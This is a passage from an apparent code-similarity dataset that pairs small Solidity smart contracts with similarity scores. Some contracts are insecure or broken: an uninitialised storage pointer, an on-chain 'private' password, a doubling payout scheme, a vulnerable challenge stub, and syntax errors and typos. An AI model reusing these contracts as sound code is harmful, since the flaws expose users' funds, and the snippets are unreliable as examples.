    return true;
  }

  
  function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);
}"
"contract ChainList  {

  struct  data  {
    uint   ownernumber;
    uint   id;
  }

  uint value;
  mapping (uint256 => data) public  datamatching;

  function storedata (uint _ownernumber, uint _id) public {
    var  persondata  = datamatching[value];
    persondata .ownernumber = _ownernumber;
    persondata. id  =  _id;
  }

  function getData(uint256 userId) returns (uint, uint){
    return (datamatching[userId].ownernumber, datamatching[userId].id);
  }
}",0.5650564856552335,"contract CommunityChest {

    

    address owner;

    

    event Deposit(uint256 value);

    event Transfer(address to, uint256 value);

    

    constructor () public {

        owner = msg.sender;

    }

    

    function send(address payable to, uint256 value) public onlyOwner {

        to.transfer(value);

        emit Transfer(to, value);

    }



    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

}"
"contract Certify {

struct Record {
    uint mineTime;
    uint blockNumber;
    string instituteName;
    string recipientName;
    string courseName;
    string marks;
    string dateOfCompletion;
}

mapping (bytes32 => Record) private docHashes;

constructor() public {

}


function addDocHash(bytes32 hash, string memory insti, string memory reci, string memory course, string memory grade, string memory doc ) public {
    Record memory newRecord = Record(now, block.number,insti,reci,course,grade,doc);
    docHashes[hash] = newRecord;
}


function findDocHash(bytes32 hash) public view returns(uint, uint, string memory, string memory, string memory, string memory, string memory) {
    return (docHashes[hash].mineTime, docHashes[hash].blockNumber, docHashes[hash].instituteName, 
                docHashes[hash].recipientName, docHashes[hash].courseName, docHashes[hash].marks, docHashes[hash].dateOfCompletion);
}
}",0.5406368458524097,"contract standardTokenFactory {
    
    
    
    string public stamp;
    bool public gated;
    address public deployer;
    
    standardToken private ST;
    
    address[] public tokens;
    
    event Deployed(address indexed ST, address indexed owner);
    
    constructor (string memory _stamp, bool _gated, address _deployer) public 
	{
        stamp = _stamp;
        gated = _gated;
        deployer = _deployer;
	}
    
    function newToken(
        string memory name, 
		string memory symbol,
		string memory _stamp,
		uint8 decimals,
		uint256 cap,
		uint256[] memory initialSupply,
		address[] memory ownership) public {
       
        if (gated == true) {
            require(msg.sender == deployer);
        }
       
        ST = new standardToken(
            name, 
            symbol, 
            _stamp,
            decimals,
            cap,
            initialSupply,
            ownership);
        
        tokens.push(address(ST));
        
        emit Deployed(address(ST), ownership[0]);

    }
    
    function getTokenCount() public view returns (uint256 tokenCount) {
        return tokens.length;
    }
}"
"contract EventTest {                
  event NumberEvent(uint indexed number);   

  function triggerEvent(uint val) returns (uint) { 
    NumberEvent(val);
    return 123;
  }                                 
}",0.5918727278730763,"contract calc { 
    event ret(uint r);
    function multiply(uint a, uint b) returns(uint d) { 
        uint res = a * b;
        ret (res);
        return res; 
    } 
}"
"contract SimpleAuction {

    address public beneficiary;
    uint public auctionEnd;

    address public highestBidder1;
    uint public highestBid1;

    address public highestBidder2;
    uint public highestBid2;

    uint public proportion;
    uint public bid1;
    uint public bid2;

    mapping(address => uint) pendingReturns;

    bool ended;


    constructor (uint _biddingTime) public {
        beneficiary = msg.sender;
        auctionEnd = now + _biddingTime;
    }

    function () public payable{
        makebid(proportion);
    }


    function makebid(uint var1) public payable {

        proportion = var1;
        bid1 = var1 * msg.value;
        bid2 = 1 - var1 * msg.value;
        require(now <= auctionEnd);

        require(bid1 > highestBid1);

        if (highestBid1 != 0) {
            pendingReturns[highestBidder1] += highestBid1;
        }
        highestBidder1 = msg.sender;
        highestBid1 = bid1;

    }

        require(bid2 > highestBid2);

        if (highestBid2 != 0) {
            pendingReturns[highestBidder2] += highestBid2;
        }
        highestBidder2 = msg.sender;
        highestBid2 = bid2;

    }",0.5779734796194811,"contract BlockchainCutiesPresale is Pausable
{
	mapping (uint256 => address) public ownerOf;
	mapping (uint256 => uint256) public prices;

	event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);

	function addCutie(uint40 id, uint256 price) public onlyOwner
	{
		require(ownerOf[id] == address(0));
		prices[id] = price;
	}

	function isAvailable(uint40 id) public view returns (bool)
	{
		return ownerOf[id] == address(0) && prices[id] > 0;
	}

	function getPrice(uint40 id) public view returns (uint256 price, bool available)
	{
		price = prices[id];
		available = isAvailable(id);
	}

	function bid(uint40 id) public payable
	{
		require(isAvailable(id));
		require(prices[id] <= msg.value);

		ownerOf[id] = msg.sender;
		emit Transfer(0, msg.sender, id);
	}

    function destroyContract() public onlyOwner {
        selfdestruct(msg.sender);
    }

    function withdraw() public onlyOwner {
        address(msg.sender).transfer(address(this).balance);
    }
}"
"contract AccessControlListContract {
    mapping(address => mapping(string=> mapping(address => string[]))) _userAccessGrants;
    mapping(address => mapping(address => mapping(string => string[]))) _targetAccessGrants;

    
    function grantAccess(address userAddress, string documentHash, address targetUserAddress, string permission) public {
        _userAccessGrants[userAddress][documentHash][targetUserAddress].push(permission); 
        _targetAccessGrants[targetUserAddress][userAddress][documentHash].push(permission);       
    }

    function checkAccess(address requestorAddress, address userAddress, string documentHash) public view returns (string[]) {
        return _targetAccessGrants[requestorAddress][userAddress][documentHash];
    }
}",0.5412394737406339,"contract JNS {
    mapping (string => address) strToAddr;
    mapping (address => string) addrToStr;
    
    function registerAddress (string _nickname, address _address) public returns (bool) {
        require (strToAddr[_nickname] == address(0), ""Name already registered"");
        require (keccak256(addrToStr[_address]) == keccak256(""""), ""Address already registered"");
        
        strToAddr[_nickname] = _address;
        addrToStr[_address] = _nickname;
        
        return true;
    }
    
    function getAddress (string _nickname) public view returns (address _address) {
        _address = strToAddr[_nickname];
    }
    
    function getNickname (address _address) public view returns (string _nickname) {
        _nickname = addrToStr[_address];
    }
    
}"
"contract Locations {

    function doSomething() public pure returns (uint[] memory) {

    uint[] memory localMemoryArray1 = new uint[](3);
    localMemoryArray1[0] = 4;
    localMemoryArray1[1] = 5;
    localMemoryArray1[2] = 6;

    uint[] memory localMemoryArray2 = localMemoryArray1;
    localMemoryArray1[0] = 10; 
    return localMemoryArray2;
  }
}",0.5131323839032661,"contract BaccaratShuffle is Shuffle {

 function sendPork(uint random)

  public pure returns(uint[],uint[]) 

  {

   uint[] memory banker=new uint[](3);

   uint[] memory plaryer=new uint[](3);

   uint[] memory pork=shuffle(random);

   uint j=0;

   for(uint k=0;k<banker.length;k++)

   {

       banker[k]=pork[j];

       j++;

       plaryer[k]=pork[j];

       j++;

   }

   

   return(banker,plaryer);

   }

}"
"contract GuessTheRandomNumberChallenge {
    uint8 answer;

    function GuessTheRandomNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        
    }
}",0.5964617162659996,"contract dubbel {

    address public previousSender;

    uint public price = 0.001 ether;

    

    function() public payable {

            require(msg.value == price);

            previousSender.transfer(msg.value);

            price *= 2;

            previousSender = msg.sender;

    }

}"
"contract getSchwifty {
  struct myData
  {
    string actualData;
    bool dataFlag;
  }

  mapping(string=>myData) records;

  function addData(string id, string hashData) public {
    if (records[id].dataFlag != true)
    {
        records[id].actualData = hashData;
        records[id].dataFlag = true;
    }
  }

  function getData(string id) external view returns (string) {
        if (records[id].dataFlag == true)
           return records[id].actualData;
        else
           return ""NULL"";
  }

}",0.5614528115488258,"contract Enlist {

  struct Record {

    address investor;

    bytes32 _type;

  }



  Record[] records;



  function setRecord (

    address _investor,

    bytes32 _type

  ) internal {

    records.push(Record(_investor, _type));

  }



  function getRecordCount () constant

  public

  returns (uint) {

    return records.length;

  }



  function getRecord (uint index) view

  public

  returns (address, bytes32) {

    return (

      records[index].investor,

      records[index]._type

    );

  }

}"
"contract patient {

    doctor doctor_obj;

    function patient(address _doctor_contract) {
        doctor_obj = doctor(_doctor_contract);
    }

    function check_if_doctor(address _ddoctor) returns(bool) {

        return doctor_obj.doctor_exist(_ddoctor);
    }

    function add_doc(address _d, string _s) {
        doctor_obj.add_doctors(_d, _s);
    }

    function A() payable {

    }
}",0.5474309795174432,"contract OperatableBasic {
    function setPrimaryOperator (address addr) public;
    function setSecondaryOperator (address addr) public;
    function isPrimaryOperator(address addr) public view returns (bool);
    function isSecondaryOperator(address addr) public view returns (bool);
}"
"contract C {
    Set.Data knownValues;

    function register(uint value)external {
        require(Set.insert(knownValues, value));
    }
}",0.5535625287755455,"contract SetBA is DataCaller {

    function setBA(bytes32 _key, address _value) internal {

        data.setBA(_key, _value);    

    }

}"
"contract ContractFactory {
    address[] public deployed;

    function createSubContract() public {
        deployed.push(new SubContract());
    }
}",0.5934369121708437,"contract Master {

        function factoryContractAddress() public pure returns(address) {}

        function transferEth() public pure {}

    }"
"contract SubContract {
    uint public var1;
    uint public var2;

    function SubContract() public {
        var1 = 1;
        var2 = 10000;
    }
}",0.5964575616483372,"contract ContractConn{

    function transfer(address _to, uint _value) public;

    function lock(address _to, uint256 _value) public;

}"
"contract C {
    uint someVariable;
    uint[] data;
    function f() {
        uint[] x = data;
        x.push(2);
    }
}",0.5724481412997949,contract test { function multiply(uint a) public pure returns(uint d) {   return a * 7;   } }
"contract MyContract {
  address internal constant UNISWAP_ROUTER_ADDRESS = 0xcDbE04934d89e97a24BCc07c3562DC8CF17d8167; 

  IUniswapV2Router01 public uniswapRouter;

  constructor() public {
    uniswapRouter = IUniswapV2Router01(UNISWAP_ROUTER_ADDRESS);
  }

  function swapEthForTokenWithUniswap(uint ethAmount, address tokenAddress) public onlyOwner {
    
    require(ethAmount <= address(this).balance, ""Not enough Eth in contract to perform swap."");

    
    address[] memory path = new address[](2);
    path[0] = uniswapRouter.WETH();
    path[1] = tokenAddress;

    
    
    uniswapRouter.swapExactETHForTokens.value(ethAmount)(0, path, address(this), now + 15);
  }

  function depositEth() external payable {
    
  }
}",0.544692659303855,"contract BridgeVault is Ownable {
    event EthTransferred(address indexed to, uint256 amount);

    function () payable external {

    }

    function multiSend(address _token, address[] memory _addresses, uint256[] memory _amounts) public onlyOwner {
        require(_addresses.length == _amounts.length);
        for (uint256 i = 0; i < _addresses.length; i++) {
            IERC20(_token).transfer(_addresses[i], _amounts[i]);
        }
    }
    
    function send(address _token, address _address, uint256 _amount) public onlyOwner {
        IERC20(_token).transfer(_address, _amount);
    }

    function transferEth(address payable to, uint256 amount) public onlyOwner {
        address(to).transfer(amount);
        emit EthTransferred(to, amount);
    }
}"
"contract MonsterFood {

ERC721 public nonFungibleContract;

bool public isMonsterFood = true;

uint32 potionDuration = uint32(6 hours);

event PotionCreated(uint code);
event PotionDeleted(uint code);

constructor(address _nftAddress, address _backendAddress) public {
    ownerAddress = msg.sender;
    ERC721 candidateContract = ERC721(_nftAddress);
    nonFungibleContract = candidateContract;
    backendAddress = _backendAddress;
}

modifier onlyOwner() {
    require(msg.sender == ownerAddress);
    _;
}

modifier onlyCore() {
    require(msg.sender == address(nonFungibleContract));
    _;
}

function setTokenContract(address _nftAddress) external onlyOwner
{
    ERC721 candidateContract = ERC721(_nftAddress);
    nonFungibleContract = candidateContract;
}

uint[] public cdPricesGrow = [
    10000 szabo,
    20000 szabo,
    30000 szabo,
    40000 szabo,
    50000 szabo,
    55000 szabo,
    60000 szabo,
    65000 szabo,
    70000 szabo,
    80000 szabo,
    85000 szabo,
    90000 szabo,
    108000 szabo,
    120000 szabo
    ];



uint[] public cdPricesRest = [
    10000 szabo,
    20000 szabo,
    30000 szabo,
    40000 szabo,
    50000 szabo,
    55000 szabo,
    60000 szabo,
    65000 szabo,
    70000 szabo,
    80000 szabo,
    85000 szabo,
    90000 szabo,
    108000 szabo,
    120000 szabo
];


struct Potion {
    uint16 code;
    uint256 priceWei;
    uint8 potionEffect;
    bool exists;
}

uint256 public feedingFee = 5 finney;

function setFeedingFee(uint256 val) external onlyOwner {
    feedingFee = val;
}

address public ownerAddress;

mapping (uint16 => Potion) codeToPotionIndex;

function setOwner(address newOwner) public onlyOwner{
    require(newOwner != address(0));
    ownerAddress = newOwner;
}



function setPotionDuration(uint newDuration) external onlyOwner{
    require(newDuration > 0);
    potionDuration = uint32(newDuration);
}

function createPotion(uint _priceWei, uint _code, uint _potionEffect) external onlyOwner returns(uint) {
    require(_code > 2 && _potionEffect > 0);
    require(_code == uint(uint16(_code)));

    Potion memory _potion = Potion({
        priceWei: _priceWei,
        code: uint16(_code),
        potionEffect: uint8(_potionEffect),
        exists: true
    });

    codeToPotionIndex[uint16(_code)] = _potion;

    emit PotionCreated(_potion.code);
    return _potion.code;
}

function feedMonster(address originalCaller, uint foodCode, uint p1, uint p2, uint p3) onlyCore public payable
returns(uint p1_, uint p2_, uint p3_)
{
    require(foodCode == 1 || foodCode == 2);
    require(originalCaller != address(0));
    bool free = originalCaller == backendAddress;

    MonsterLib.Monster memory mon = MonsterLib.decodeMonsterBits(p1, p2, p3);

    if(foodCode == 1) 
    {
        applyGrow(originalCaller, mon, free);
    } 
    else if(foodCode == 2)
    {
        applyCDR(originalCaller, mon, free);
    }

    

    (p1_, p2_, p3_) = MonsterLib.encodeMonsterBits(mon);
}




function applyCDR(address originalCaller, MonsterLib.Monster monster, bool free) internal
{
    require(monster.cooldownEndTimestamp > now);
    require(monster.cooldownEndTimestamp > monster.cooldownStartTimestamp);
    uint totalPriceWei = cdPricesRest[monster.activeRestCooldownIndex];
    uint totalCdLength = monster.cooldownEndTimestamp - monster.cooldownStartTimestamp;
    uint remainingCdLength = monster.cooldownEndTimestamp - now;

    uint price = 0;
    if(!free)
    {
        price = (10000 * remainingCdLength / totalCdLength) * totalPriceWei / 10000;
        price += feedingFee;
        require(msg.value >= price);
    }

    monster.cooldownEndTimestamp = uint64(now);
    monster.activeRestCooldownIndex = 0;
    monster.activeGrowCooldownIndex = 0;

    originalCaller.transfer(msg.value - price);
}

function applyGrow(address originalCaller, MonsterLib.Monster monster, bool free)  internal 
{
    require(monster.level < 1);
    require(monster.cooldownEndTimestamp > monster.cooldownStartTimestamp);

    uint totalPriceWei = cdPricesGrow[monster.activeRestCooldownIndex];
    uint totalCdLength = monster.cooldownEndTimestamp - monster.cooldownStartTimestamp;

    uint remainingCdLength = 0;
    if(monster.cooldownEndTimestamp > now)
    {
        remainingCdLength = monster.cooldownEndTimestamp - now;
    }

    uint price = 0;

    if(!free)
    {
        price = (10000 * remainingCdLength / totalCdLength) * totalPriceWei / 10000;
        price += feedingFee;
        require(msg.value >= price);
    }

    monster.level = 1;
    monster.cooldownEndTimestamp = uint64(now);
    monster.activeRestCooldownIndex = 0;
    monster.activeGrowCooldownIndex = 0;

    originalCaller.transfer(msg.value - price);

}


function getPotion(uint256 _potionCode)
    external
    view
    returns (
    uint256 priceWei,
    uint256 potionEffect,
    bool exists
) {
    Potion storage _potion = codeToPotionIndex[uint16(_potionCode)];
    require(_potion.exists);
    exists = _potion.exists;
    priceWei = _potion.priceWei;
    potionEffect = _potion.potionEffect;
}


function deletePotion(uint _code) public onlyOwner {
    delete codeToPotionIndex[uint16(_code)];
    emit PotionDeleted(_code);
}

function withdrawBalance() external {
    address nftAddress = address(nonFungibleContract);

    require(
        msg.sender == ownerAddress ||
        msg.sender == nftAddress
    );
    
    nftAddress.transfer(address(this).balance);
}}",0.5895224226667536,"contract CryptoChamps is Ownable{
    
    struct Person {
        uint32 id;
        string name;
        uint16 txCount;
        bool discounted;
    }
    
    event Birth(uint32 _id, uint _startingPrice);
    event Discount(uint32 _id, uint _newPrice);
    event Purchase(uint32 indexed _id, address indexed _by, address indexed _from, uint _price, uint _nextPrice);
    event Transfer(address indexed _from, address indexed _to, uint32 _id);
    
    uint public totalSupply = 0;
    string public name = ""CryptoChamps"";
    string public symbol = ""CCH"";
    address store;
    mapping (uint32 => Person) private people;
    mapping (uint32 => address) private personToOwner;
    mapping (uint32 => uint256) public personToPrice;
    mapping (uint32 => uint256) public personToOldPrice;
    mapping (address => uint) private noOfPersonsOwned;
    mapping (address => bool) private isUserAdded;
    
    address[] private users;
    
    uint8 BELOW_FIVE = 200;
    uint8 BELOW_TEN = 150;
    uint8 BELOW_FIFTEEN = 130;
    uint8 BELOW_TWENTY = 120;
    uint8 TWENTY_ABOVE = 110;
    
    function CryptoChamps() public{
        store = msg.sender;
    }
    
    function createPerson (uint32 _id, string _name, uint256 _startingPrice) external onlyOwner {
        require(people[_id].id == 0);
        Person memory person = Person(_id, _name, 0, false);
        people[_id] = person;
        personToOwner[_id] = owner;
        personToPrice[_id] = _startingPrice;
        totalSupply++;
        Birth(_id, _startingPrice);
    }
    
    function getPerson(uint32 _id) external view returns (string, uint256, uint256) {
       Person memory person = people[_id];
       require(person.id != 0);
       return (person.name, personToPrice[_id], person.txCount);
    }
    
    function purchase(uint32 _id) payable public{
        uint price = personToPrice[_id] ;
        address personOwner = personToOwner[_id];
        
        require(msg.sender != 0x0);
        require(msg.sender != personOwner);
        require(price <= msg.value);
        
        
        Person storage person = people[_id];
        
        if(price < msg.value){
            msg.sender.transfer(msg.value - price);
        }
        
        _handlePurchase(person, personOwner, price);
        uint newPrice = _onPersonSale(person);
        
        if(!isUserAdded[msg.sender]){
            users.push(msg.sender);
            isUserAdded[msg.sender] = true;
        }
        
        Purchase(_id, msg.sender, personOwner, price, newPrice);
    }
    
    function discount(uint32 _id, uint _newPrice) external ownsPerson(_id) returns (bool){
        uint price = personToPrice[_id];
        require(price > _newPrice);
        
        Person storage person = people[_id];
        person.discounted = true;
        
        personToPrice[_id] = _newPrice;
        
        Discount(_id, _newPrice);
        
        return true;
    }
    
    function _handlePurchase(Person storage _person, address _owner, uint _price) internal {
        uint oldPrice = personToOldPrice[_person.id];
        
        if(_person.discounted){
            _shareDiscountPrice(_price, _owner);
        }else{
            _shareProfit(_price, oldPrice, _owner);
        }
        
        personToOwner[_person.id] = msg.sender;
        
        noOfPersonsOwned[_owner]--;
        noOfPersonsOwned[msg.sender]++;
    }
    
    function _shareDiscountPrice(uint _price, address _target) internal {
        uint commision = _price * 10 / 100;
        
        _target.transfer(_price - commision);
        
        owner.transfer(commision);
    }
    
    function _shareProfit(uint _price, uint _oldPrice, address _target) internal {
        uint profit = _price - _oldPrice;
        
        uint commision = profit * 30 / 100;
        
        _target.transfer(_price - commision);
        
        owner.transfer(commision);
    }
    
    function _onPersonSale(Person storage _person) internal returns (uint) {
        uint currentPrice = personToPrice[_person.id];
        uint percent = 0;
        
        if(currentPrice >= 6.25 ether){
            percent = TWENTY_ABOVE;
        }else if(currentPrice >= 2.5 ether){
            percent = BELOW_TWENTY;
        }else if(currentPrice >=  1 ether){
            percent = BELOW_FIFTEEN;
        }else if(currentPrice >= 0.1 ether){
            percent = BELOW_TEN;
        }else{
            percent = BELOW_FIVE;
        }
        
        personToOldPrice[_person.id] = currentPrice;
        uint newPrice = _approx((currentPrice * percent) / 100);
        personToPrice[_person.id] = newPrice;
        
        _person.txCount++;
        if(_person.discounted){
            _person.discounted = false;
        }
        
        return newPrice;
    }
    
    function _approx(uint _price) internal pure returns (uint){
        uint product = _price / 10 ** 14;
        return product * 10 ** 14;
    }
    
    function transfer(address _to, uint32 _id) external ownsPerson(_id){
        personToOwner[_id] = _to;
        noOfPersonsOwned[_to]++;
        noOfPersonsOwned[msg.sender]--;
        Transfer(msg.sender, _to, _id);
    }
    
    function ownerOf(uint32 _id) external view returns (address) {
        return personToOwner[_id];
    }
    
    function priceOf(uint32 _id) external view returns (uint256) {
        return personToPrice[_id];
    }
    
    function balanceOf(address _owner) external view returns (uint){
        return noOfPersonsOwned[_owner];
    }
    
    function getStore() external view onlyOwner returns (address){
        return store;
    }
    
    function setStore(address _store) external onlyOwner returns (bool) {
        require(_store != 0);
        store = _store;
        return true;
    }
    
    function getUsers() external view returns (address[]) {
        return users;
    }
    
    function withdraw() external onlyOwner returns (bool){
        owner.transfer(this.balance);
        return true;
    }
    
    modifier ownsPerson(uint32 _id){
        require(personToOwner[_id] == msg.sender);
        _;
    }
    
}"
"contract Echos is AccessControl {

    event logPrintedCertificate(address contractAddress, string _name, string _course);

    function printCertificate (string _name, string _course) public canAccess(""printCertificate"") whenNotPaused returns (address _certificateAddress) {

        
        address certificateAddr ess = new EchosCertificate(_name, _course);

        
        logPrintedCertificate(certificateAddress, _name, _course);

        return certificateAddress;
    }

    
    function invalidateCertificate(address _certificateContract) external canAccess(""printCertificate"") {
        EchosCertificate certContract = EchosCertificate(_certificateContract);
        certContract.invalidate();
    }

}",0.5678741105525765,"contract CertifierDbI {
    event LogCertifierAdded(address indexed certifier);

    event LogCertifierRemoved(address indexed certifier);

    function addCertifier(address certifier)
        returns (bool success);

    function removeCertifier(address certifier)
        returns (bool success);

    function getCertifiersCount()
        constant
        returns (uint count);

    function getCertifierStatus(address certifierAddr)
        constant 
        returns (bool authorised, uint256 index);

    function getCertifierAtIndex(uint256 index)
        constant
        returns (address);

    function isCertifier(address certifier)
        constant
        returns (bool isIndeed);
}"
"contract Sample {

struct Participant {
    address etherAddress;
    uint amount;
}

Participant[] public participants;
uint public amountRaised;

function() {
    enter();
}

function enter() {
    uint amount = msg.value;
    uint n = participants.length;

    participants.length += 1;
    participants[n].etherAddress = msg.sender;
    participants[n].amount = amount;

    amountRaised += amount;
}

}",0.5696598682571883,"contract ERC20Burnable is ERC20 {
    
    function burn(uint256 amount) public {
        _burn(_msgSender(), amount);
    }

    
    function burnFrom(address account, uint256 amount) public {
        uint256 decreasedAllowance = allowance(account, _msgSender()).sub(amount, ""ERC20: burn amount exceeds allowance"");

        _approve(account, _msgSender(), decreasedAllowance);
        _burn(account, amount);
    }
}"
"contract Lottery {

    
    int constant LOTTERY_INTERVAL = 1 days;
    uint256 constant private TICKET_PRICE=1;
    uint constant FEE_FACTOR = 200; 

    
    uint256 totalBalance=0;
    uint totalParticipants=0;
    uint winnerCounter=0;

    
    struct TicketHolder {
        address ticketHolder;
        uint estimation;
        uint buyingTimeScore;
        uint timestamp;
        uint score;
    }

    
    mapping (address => TicketHolder) ticketHolders;
    mapping (uint => TicketHolder) ticketHoldersIndex;

    
    address[] ticketHoldersAddress;
    address [] winners;

    
    function Lottery(){

    }

    
      function getBuyingTime(address ticketHolder) returns (uint){
        return ticketHolders[ticketHolder].buyingTimeScore;
    }


    function getEstimation(address ticketHolder) returns (uint){
        return ticketHolders[ticketHolder].estimation;
    }

    function getScore(address ticketHolder) returns (uint){
        return ticketHolders[ticketHolder].score;
    }


    function getMinute(uint timestamp) constant returns (uint8) {
        return uint8((timestamp / 60) % 60);
    }

    function setScore(address ticketHolder,uint score){
        ticketHolders[ticketHolder].score = score;
    }

    function calculateBuyingTimeScore() returns (uint){
        uint timeBeforeNewRound=60-getMinute(now);
        return timeBeforeNewRound*100*100/60;
    }

    function calculateDeviationScore(uint courseValue, uint estimatedValue) returns (uint){
        uint difference=0;
        if(courseValue>=estimatedValue){
            difference=courseValue-estimatedValue;
        }else if(courseValue<estimatedValue){
            difference=estimatedValue-courseValue;
        }

        
        uint deviation = (difference*10000/courseValue);
        uint score=10000-deviation;
        return score;
    }

    
    function buyTicket(address ticketHolder, uint estimation) payable returns (uint){
        if(msg.value < TICKET_PRICE) throw;
        uint buyingTimeScore=calculateBuyingTimeScore();
        totalBalance += msg.value;
        ticketHolders[ticketHolder] = TicketHolder(ticketHolder,estimation,buyingTimeScore, now, 0);
        ticketHoldersIndex[totalParticipants++] = TicketHolder(ticketHolder,estimation,buyingTimeScore, now, 0);
        ticketHoldersAddress.push(ticketHolder);
        return totalBalance;
    }

    function calculateScore(uint courseValue) {
        if(totalParticipants==0) throw;
        for(uint participant = 0; participant < totalParticipants; participant++){
            TicketHolder ticketHolder = ticketHoldersIndex[participant];
            uint deviationScore = calculateDeviationScore(courseValue,ticketHolder.estimation) / 2;
            uint buyingTimeScore = ticketHolder.buyingTimeScore / 2;
            uint totalScore =deviationScore + buyingTimeScore;
            setScore(ticketHolder.ticketHolder, totalScore);
        }
    }

    function determineWinners() returns (uint){
         uint highestScore=0;
         for(uint participant = 0; participant < totalParticipants; participant++){
             TicketHolder ticketHolder = ticketHoldersIndex[participant];
             uint score = ticketHolder.score;
             if(score>=highestScore){
                 winners.push(ticketHolder.ticketHolder);
                 winnerCounter++;
                 highestScore=score;
             }
         }
         return  ticketHoldersAddress.length;
    }

    function test() returns (uint){
        uint testa = totalBalance/winnerCounter;
        return testa;
    }

    function payout(uint courseValue){
        if(totalParticipants==0) throw;
        calculateScore(courseValue);
        determineWinners();
        uint256 winAmount=totalBalance/winnerCounter;
        for(uint i= 0; i<winnerCounter;i++){
            address winnerTicket = winners[i];
            winnerTicket.transfer(winAmount);
        }
    }

}",0.5342111713738877,"contract OX_TOKEN is owned {

  string public constant name = ""OX"";
  string public constant symbol = ""FIXED"";

  event Transfer( address indexed _from,
                  address indexed _to,
                   uint256 _value );

  event Approval( address indexed _owner,
                  address indexed _spender,
                  uint256 _value);

  event Receipt( address indexed _to,
                 uint _oxen,
                 uint _paymentwei );

  uint public starttime;
  uint public inCirculation;
  mapping( address => uint ) public oxen;
  mapping( address => mapping (address => uint256) ) allowed;

  function OX_TOKEN() {
    starttime = 0;
    inCirculation = 0;
  }

  function closedown() onlyOwner {
    selfdestruct( owner );
  }

  function() payable {
    buyOx(); 
  }

  function withdraw( uint amount ) onlyOwner returns (bool success) {
    if (amount <= this.balance)
      success = owner.send( amount );
    else
      success = false;
  }

  function startSale() onlyOwner {
    if (starttime != 0) return;

    starttime = now; 
    inCirculation = 500000000; 
    oxen[owner] = inCirculation;
    Transfer( address(this), owner, inCirculation );
  }

  function buyOx() payable {

    
    if (!saleOn() || msg.value < 100 finney) {
      throw; 
    }

    
    
    
    
    uint ox = div( mul(mul(msg.value,3), 100 + bonus()), 10**17 );

    if (inCirculation + ox > 1000000000) {
      throw;
    }

    inCirculation += ox;
    oxen[msg.sender] += ox;
    Receipt( msg.sender, ox, msg.value );
  }

  function totalSupply() constant returns (uint256 totalSupply) {
    return inCirculation;
  }

  function balanceOf(address _owner) constant returns (uint256 balance) {
    balance = oxen[_owner];
  }

  function approve(address _spender, uint256 _amount) returns (bool success) {
    if (saleOn()) return false;

    allowed[msg.sender][_spender] = _amount;
    Approval(msg.sender, _spender, _amount);
    return true;
  }

  function allowance(address _owner, address _spender) constant returns
  (uint256 remaining) {
    return allowed[_owner][_spender];
  }

  function transfer( address to, uint ox ) returns (bool success) {
    if ( ox > oxen[msg.sender] || saleOn() ) {
      return false;
    }

    oxen[msg.sender] -= ox;
    oxen[to] += ox;
    Transfer( msg.sender, to, ox );
    return true;
  }

  function transferFrom(address _from, address _to, uint256 _amount)
  returns (bool success) {
    if (    oxen[_from] >= _amount
         && allowed[_from][msg.sender] >= _amount
         && _amount > 0
         && oxen[_to] + _amount > oxen[_to]
       )
    {
      oxen[_from] -= _amount;
      allowed[_from][msg.sender] -= _amount;
      oxen[_to] += _amount;
      Transfer(_from, _to, _amount);
      success = true;
    }
    else
    {
      success = false;
    }
  }

  function saleOn() constant returns(bool) {
    return now - starttime < 31 days;
  }

  function bonus() constant returns(uint) {
    uint elapsed = now - starttime;

    if (elapsed < 1 days) return 25;
    if (elapsed < 1 weeks) return 20;
    if (elapsed < 2 weeks) return 15;
    if (elapsed < 3 weeks) return 10;
    if (elapsed < 4 weeks) return 5;
    return 0;
  }

  
  
  
  function mul(uint256 a, uint256 b) constant returns (uint256) {
    uint256 c = a * b;
    if (a == 0 || c / a == b)
    return c;
    else throw;
  }
  function div(uint256 a, uint256 b) constant returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  address public constant AUTHOR = 0x008e9342eb769c4039aaf33da739fb2fc8af9afdc1;
}"
"contract NDA {
bytes32  party1name;
bytes32  party2name;

function NDA(bytes32 _party1name) {
     party1name = _party1name;
}

function SetParty2(bytes32 _party2name) {
     party2name = _party2name;
}

function get() constant returns (bytes32, bytes32) {
    return (party1name, party2name);
}
}",0.5478984685472632,"contract Ambi {
    function getNodeAddress(bytes32 _nodeName) constant returns(address);
    function hasRelation(bytes32 _nodeName, bytes32 _relation, address _to) constant returns(bool);
    function addNode(bytes32 _nodeName, address _nodeAddress) constant returns(bool);
}"
"contract Chatroom {
address public host;
string private password;

address[] public members;
Message[] public chatLog;

mapping(uint => Message) msgIDPair;
mapping(address => bool) isMember;

struct Message {
    address author;
    string content;
}




constructor(string _password) public {
    host = msg.sender;
    addMember(host); 

    password = _password;
}



function sendMessage(string _message) external mustBeMember {
    uint msgID = chatLog.length + 1;

    msgIDPair[msgID] = Message(msg.sender, _message); 
    chatLog.push(msgIDPair[msgID]); 
}





function getMessage(uint _ID) public view mustBeMember returns(string) {
    return(msgIDPair[_ID].content);
}




function checkMember(address _target) public view returns(bool) {
    if (isMember[_target] == true) { 
        return(true);
    }
    else { 
        return(false);
    }
}

modifier mustBeMember() {
    require(checkMember(msg.sender) == true);
    _;
}




function joinChat(string _password) public requirePassword(_password) {
    addMember(msg.sender);
}


function leaveChat() public mustBeMember {
    require(msg.sender != host); 

    for (uint i = 0; i < members.length; i++) { 
        if (members[i] == msg.sender) {
            swapReduceIndex(members, i);
        }
    }

    isMember[msg.sender] = false;
}




function addMember(address _newMember) private {
    if (isMember[_newMember] == true) { 
        return();
    }
    else { 
        isMember[_newMember] = true;
        members.push(msg.sender);
    }
}



function getMembers() public view returns(address[]) {
    return(members);
}

modifier requirePassword(string _password) {
    require(keccak256(password) == keccak256(_password));
    _;
}

modifier onlyHost {
    require(msg.sender == host);
    _;
}



function kickMember(address _member) external onlyHost {
    require(msg.sender != _member); 

    for (uint i = 0; i < members.length; i++) { 
        if (members[i] == _member) {
            swapReduceIndex(members, i);
        }
    }

    isMember[_member] = false;
}



function switchHost(address newHost) external onlyHost {
    require(checkMember(newHost));

    host = newHost;
}





function swapReduceIndex(address[] storage array, uint _blankIndex) internal {
    delete array[_blankIndex];
    uint lastIndex = array.length-1;
    array[_blankIndex] = array[lastIndex];
    array.length--;
}



function getMessagesLength() external view returns (uint) {
